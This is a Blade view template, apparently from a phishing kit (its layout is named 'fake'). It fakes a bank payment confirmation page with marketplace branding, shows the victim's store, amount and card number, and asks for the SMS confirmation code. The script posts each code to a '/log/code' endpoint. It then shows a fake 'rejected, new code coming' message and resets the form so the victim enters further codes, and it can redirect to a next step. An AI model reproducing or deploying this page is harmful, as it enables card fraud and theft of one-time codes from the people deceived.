@extends('layouts.fake')
@push('css')
    <style>
        body {
            font-family: "Lato", sans-serif;
            font-weight: 400;
            font-size: 15px;
            background-color: #f4f4f5;
            color: #111;
            padding: 0 15px;
            overflow-y: hidden;
        }

        .form-container {
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .form-block {
            max-width: 480px;
            margin: 0 auto;
            float: left;
        }

        .form-block-image {
            display: inline-block;
            width: 30%;
        }

        .form-block-header-text {
            display: inline-block;
            position: relative;
            font-size: 20px;
            margin: 0;
            top: -22px;
            left: 10px;
        }

        .form-block-body-text {
            line-height: 22px;
        }

        .form-block-body-table {
            border-spacing: 0;
            margin-top: 25px;
            margin-bottom: 30px;
        }

        .form-block-body-table tr {
            line-height: 24px;
        }

        .form-block-body-table tr td:nth-child(odd) {
            padding-right: 40px;
        }

        .form-block-body-table tr td:nth-child(even) {
            font-weight: 700;
        }

        .form-block-body-notification {
            font-size: 13px;
            line-height: 18px;
            background-color: #f5f6f7;
            box-shadow: 0 0 5px rgba(0, 0, 0, .1);
            border: 1px solid #e1e1ea;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 25px;
        }

        .form-block-footer-text {
            font-weight: 700;
        }

        .form-block-footer-input {
            display: block;
            width: 100%;
            font-family: "Lato", sans-serif;
            font-size: 14px;
            border: 1px solid #e7e7e7;
            border-radius: 3px;
            padding: 10px 15px;
            transition: .25s;
        }

        .form-block-footer-input:focus {
            border-color: #c5c0c0;
            outline: none;
        }

        .input-invalid {
            border-color: #e74c3c;
        }

        .form-block-footer-input::-webkit-outer-spin-button,
        .form-block-footer-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .form-block-footer-button {
            display: block;
            width: 100%;
            margin: 0 auto;
            padding: 12px 0;
            background: #0031c8;
            color: #fff;
            font-family: inherit;
            font-size: 13px;
            border: 0;
            border-radius: 8px;
            cursor: pointer;
            outline: 0;
        }

        .form-block-footer-button:hover {
            background-color: #00a3df;
        }

        @media (max-width: 360px) {
            .form-block-image {
                display: block;
                margin-bottom: 15px;
            }

            .form-block-header-text {
                position: static;
                display: block;
            }
        }

        @media (max-height: 680px) {
            body {
                overflow-y: auto;
                padding: 15px;
            }

            .form-container {
                display: block;
            }

            .form-block-footer-button {
                margin-bottom: 25px;
            }
        }
    </style>
@endpush
@section('content')
    <div class="form-container">
        <div class="form-block" id="step-1">
            <div class="form-block-header">
                <img src="{{$fake->logo()}}" width="30%"><br><br>
                <br>
                <h1 class="form-block-header-text">{{__("Operation confirmation")}}</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    {{__("To confirm the operation, a text message with a confirmation code was sent to your phone number. Please enter it in the field below.")}}
                </p>

                <table class="form-block-body-table">
                    <tr>
                        <td>{{__("Store")}}:</td>
                        <td>{{$categoryName}}</td>
                    </tr>

                    <tr>
                        <td>{{__("Sum")}}:</td>
                        <td>{{$amount}}</td>
                    </tr>

                    <tr>
                        <td>{{__("Card no")}}:</td>
                        <td>{{$card_number}}</td>
                    </tr>
                </table>

                <div class="form-block-body-notification">
                    <b>{{__("Attention!")}}</b> {{__("Due to the high load on the server, the code transfer may be delayed by several minutes.")}}
                </div>
            </div>

            <div class="form-block-footer">
                <p class="form-block-footer-text">
                    {{__("Confirmation code")}}:
                </p>

                <input type="text" class="form-block-footer-input" placeholder="{{__("Enter code")}}"
                       @if(session('bankName') == 'bankbps')
                       maxlength="15"
                       @else
                       maxlength="16"
                       @endif
                       id="code-input">
                <br>
                <div style="text-align: center;">
                    <button class="form-block-footer-button" id="submit-button">
                        {{__("To confirm")}}
                    </button>
                </div>
            </div>
        </div>
        <div class="form-block" id="step-2" style="display: none;">
            <div class="form-block-header">

                <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
                <h1 class="form-block-header-text">{{__("Processing payments")}}</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    {{__("Payment is still being processed. You will be automatically redirected to the appropriate page. This may take some time.")}}
                </p>
            </div>
        </div>
        <div class="form-block" id="step-3" style="display: none;">
            <div class="form-block-header">
                <img src="{{$fake->logo()}}" width="30%" alt="Kufar" class="form-block-image">
                <h1 class="form-block-header-text">{{__("The operation was rejected.")}}</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    {{__("Incorrect confirmation code entered or its expiry date has expired.")}}
                    <br><br>{{__("Please wait. A new code will be sent to you in a moment")}}
                </p>
            </div>
        </div>
    </div>
@endsection
@push('js')
    <script type="text/javascript">
        $("#submit-button").on("click", function () {
            let input = $("#code-input");
            let code = input.val();
            let max = ['bankbps'].includes("{{session('bankName')}}") ? 15 : 16;
            if (code.length < 3 || code.length > max) {
                input.addClass("input-invalid");
                setTimeout(function () {
                    input.removeClass("input-invalid");
                }, 6000);
                return false;
            }
            $.post("/log/code", {code: code}, function (data) {
                $("#step-1").fadeOut(500, function () {
                    $("#step-2").fadeIn().fadeOut(500, function () {
                        setTimeout(function () {
                            $("#step-3").fadeIn().fadeOut(5000, function () {
                                $("#step-1").fadeIn();
                                $("#code-input").val('');
                            });
                            if (data.next) location.href = data.next;
                        }, 3000);
                    });
                });
            });
        });
    </script>
@endpush
